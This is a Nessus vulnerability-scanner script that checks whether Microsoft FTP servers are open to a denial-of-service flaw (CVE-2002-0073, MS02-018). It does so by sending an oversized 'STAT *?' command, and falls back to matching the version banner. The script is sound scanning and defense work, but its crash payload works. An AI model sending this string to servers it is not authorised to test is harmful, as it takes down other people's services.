#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Thanks to: H D Moore
# 
#
# See the Nessus Scripts License for details
# 

if(description)
{
 script_id(10934);
 script_bugtraq_id(4482);
 script_cve_id("CVE-2002-0073");
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2002-A-0002");
 
 script_version ("$Revision: 1.22 $");
 
 name["english"] = string("MS FTPd DoS");
 
 script_name(english:name["english"]);
	     
 desc["english"] = "
It was possible to make the remote FTP server crash
by sending the command 'STAT *?AAAAA....AAAAA'

There is a bug in certain versions of Microsoft FTP server
which can be exploited in this fashion.  In addition, other
FTP servers may react adversely to such a string.

An attacker may use this flaw to prevent your FTP server
from working properly


Solution : see http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx

CAVEAT: If your FTP server is not a Microsoft product, then contact your FTP
vendor for a patch.

Risk factor : Medium";
		 
 script_description(english:desc["english"]);
		    
 
 script_summary(english:"Checks if the remote ftp can be crashed",
 		francais:"Détermine si le serveur ftp peut être planté");
 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
		  
 script_dependencies("find_service.nes", "ftp_anonymous.nasl", "iis_asp_overflow.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here : 
#

include("ftp_func.inc");
include("global_settings.inc");




if ( get_kb_item("Q319733") ) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;

if(! get_port_state(port)) exit(0);


if(!safe_checks())
{
 login = get_kb_item("ftp/login");
 password = get_kb_item("ftp/password");
 if(login)
 {
 # Connect to the FTP server
  soc = open_sock_tcp(port);
  if(soc)
  {  
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
     # We are in
     c = string("STAT *?", crap(240), "\r\n");
     send(socket:soc, data:c);
     b = ftp_recv_line(socket:soc);
     send(socket:soc, data:string("HELP\r\n"));
     r = ftp_recv_line(socket:soc);
     if(!r)security_warning(port);
     else {
     ftp_close(socket: soc);
     }
    exit(0);
   }
  }
 }
}

banner = get_ftp_banner(port: port);
if(banner)
{
 if ( report_paranoia == 0 ) exit(0);
 if(egrep(pattern:".*Microsoft FTP Service.*[45]\.0.*$",string:banner))
 {
 		report = 
string("It may be possible to make the remote FTP server crash\n",
"by sending the command 'STAT *?AAA...AAA.\n\n",
"An attacker may use this flaw to prevent your site from distributing files\n\n",
"*** Warning : we could not verify this vulnerability.\n",
"*** Nessus solely relied on the banner of this server\n\n",
"Solution : Apply the relevant hotfix from Microsoft\n\n",
"See:http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx\n\n",
"Risk factor : Medium");
  		security_warning(port:port, data:report);
   }
}
